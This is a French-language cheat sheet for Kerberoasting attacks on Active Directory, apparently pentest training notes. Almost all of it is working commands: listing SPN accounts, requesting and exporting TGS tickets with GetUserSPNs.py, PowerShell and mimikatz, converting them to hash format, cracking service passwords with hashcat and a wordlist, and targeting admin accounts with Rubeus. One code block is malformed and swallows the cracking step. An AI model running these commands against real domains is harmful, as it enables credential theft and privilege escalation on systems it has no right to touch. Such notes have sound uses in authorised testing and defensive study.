# Kerberoasting

## Kerberoasting

Prérequis: il est nécessaire d'avoir accès à un compte user sur le domaine, un shell, ou bien l'accès à un compte avec des privilèges élevés (SYSTEM).

Lister les users qui ont un SPN et sont donc "kerberoastable":

```bash
GetUserSPNs.py -dc-ip $ip $domain/$user
```

Faire un request de tout les tickets TGS:

```bash
GetUserSPNs.py -dc-ip $ip $domain/$user -request -outputfile sqldev_tgs
```

Faire un request pour un utilisateur en particulier:

````bash
GetUserSPNs.py -dc-ip $ip $domain/$user -request-user $usertgs -outputfile tgs

Cracker les tickets avec hashcat:
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
````

## En local sur Windows

Énumérer les utilisateurs avec le SPN:

```powershell
setspn.exe -Q */*
```

Le principe est ensuite de loader les tickets en mémoire, puis de les extraire via mimikatz dans un second temps.

Pour un utilisateur unique:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$user/$domain:$nombre"

exemple: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 (trouvable via setspn.exe)
```

Pour tout les utilisateurs:

```powershell
setspn.exe -T $domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Lancer mimikatz, puis:

```powershell
base64 /out:true
kerberos::list /export
```

Le résultat en base64 peut ensuite être décodé sur l'host et cracké:

```bash
cat file_contenant_le_base64 | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## Powerview : voir powerview.md

## Rubeus.exe

Énumérer le nombre d'utilisateurs kerberoastable:

```powershell
.\Rubeus.exe kerberoast /stats
```

Extraire les tickets des utilisateurs potentiellement intéressants (admincount=1):

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
